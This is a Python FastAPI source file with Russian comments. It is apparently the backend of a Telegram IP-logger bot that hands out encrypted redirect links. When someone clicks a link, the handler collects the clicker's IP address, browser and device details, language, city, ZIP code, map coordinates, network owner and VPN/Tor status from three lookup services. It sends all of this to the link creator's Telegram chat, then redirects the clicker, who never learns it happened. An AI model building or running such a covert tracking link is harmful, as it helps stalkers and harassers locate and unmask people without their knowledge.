from fastapi import FastAPI, Request
from fastapi.responses import RedirectResponse, JSONResponse
from cryptography.fernet import Fernet
import httpx
import json
from datetime import datetime
from config import SECRET_KEY, BOT_TOKEN, VPNAPI_KEY
import user_agents

app = FastAPI()
cipher = Fernet(SECRET_KEY)

IPINFO_TOKEN = ""  # Можно оставить пустым

@app.get("/link/{encrypted_url}")
async def redirect_encrypted(request: Request, encrypted_url: str):
    # Расшифровка ссылки
    try:
        data_json = cipher.decrypt(encrypted_url.encode()).decode()
        data = json.loads(data_json)
        original_url = data["url"]
        user_id = data["user_id"]
        expires_timestamp = data.get("expires")
    except Exception as e:
        print("Ошибка при расшифровке ссылки:", e)
        return JSONResponse({"error": "Invalid link"}, status_code=400)

    # Проверка срока жизни ссылки
    if expires_timestamp and datetime.utcnow().timestamp() > expires_timestamp:
        return JSONResponse({"error": "Срок действия ссылки истёк"}, status_code=403)

    # Определяем IP
    ip = request.headers.get("x-forwarded-for", request.client.host)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()

    # Заголовки
    headers = request.headers
    user_agent_str = headers.get("user-agent", "Unknown")
    accept_lang = headers.get("accept-language", "N/A")

    # Парсим User-Agent
    ua = user_agents.parse(user_agent_str)

    geo_info = {}
    vpn_info = {
        "vpn": "N/A",
        "proxy": "N/A",
        "tor": "N/A",
        "asn": "N/A",
        "org": "N/A",
        "connection_type": "N/A",
        "timezone": "N/A"
    }

    async with httpx.AsyncClient() as client:
        # Гео через ip-api.com
        try:
            geo_resp = await client.get(
                f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp",
                timeout=5.0
            )
            if geo_resp.status_code == 200:
                geo_info = geo_resp.json()
        except Exception as e:
            print("Ошибка geo:", e)

        # ASN/org/timezone через ipinfo.io
        try:
            url = f"https://ipinfo.io/{ip}/json"
            if IPINFO_TOKEN:
                url += f"?token={IPINFO_TOKEN}"
            info_resp = await client.get(url, timeout=5.0)
            if info_resp.status_code == 200:
                info = info_resp.json()
                vpn_info.update({
                    "asn": info.get("org", "N/A").split(" ")[0] if info.get("org") else "N/A",
                    "org": info.get("org", "N/A"),
                    "connection_type": info.get("type", "N/A"),
                    "timezone": info.get("timezone", "N/A"),
                })
        except Exception as e:
            print("Ошибка ipinfo:", e)

        # VPN/Proxy/Tor через VPNAPI.io
        try:
            vpn_resp = await client.get(
                f"https://vpnapi.io/api/{ip}?key={VPNAPI_KEY}",
                timeout=5.0
            )
            if vpn_resp.status_code == 200:
                vdata = vpn_resp.json()
                vpn_info.update({
                    "vpn": vdata.get("security", {}).get("vpn", "N/A"),
                    "proxy": vdata.get("security", {}).get("proxy", "N/A"),
                    "tor": vdata.get("security", {}).get("tor", "N/A"),
                })
        except Exception as e:
            print("Ошибка VPNAPI.io:", e)

    # Формируем сообщение (HTML)
    msg_text = f"""
<b>🔗 Кто-то кликнул по твоей ссылке!</b>

🕒 Время: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
🌐 IP: {ip}
🖥 User-Agent: <code>{user_agent_str}</code>
🌏 Язык системы: {accept_lang}

💻 Платформа: {ua.os.family} {ua.os.version_string}
🌍 Браузер: {ua.browser.family} {ua.browser.version_string}
📱 Тип устройства: {ua.device.family}

🏙 Гео:
- Страна: {geo_info.get('country', 'N/A')}
- Регион: {geo_info.get('regionName', 'N/A')}
- Город: {geo_info.get('city', 'N/A')}
- ZIP: {geo_info.get('zip', 'N/A')}
- ISP: {geo_info.get('isp', 'N/A')}
- Координаты: {geo_info.get('lat', 'N/A')}, {geo_info.get('lon', 'N/A')}
- <a href="https://www.google.com/maps?q={geo_info.get('lat', 'N/A')},{geo_info.get('lon', 'N/A')}">Google Maps</a>

🌐 Сеть:
- ASN: {vpn_info.get('asn')}
- Организация: {vpn_info.get('org')}
- Часовой пояс: {vpn_info.get('timezone')}

🔒 VPN/Proxy/Tor:
- VPN: {vpn_info.get('vpn')}
- Proxy: {vpn_info.get('proxy')}
- Tor: {vpn_info.get('tor')}
"""

    # Отправка в Telegram
    try:
        async with httpx.AsyncClient() as client:
            resp = await client.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": user_id, "text": msg_text, "parse_mode": "HTML"},
                timeout=5.0
            )
            if resp.status_code != 200:
                print("Ошибка ответа от Telegram:", resp.text)
    except Exception as e:
        print("Ошибка отправки в Telegram:", e)

    return RedirectResponse(original_url)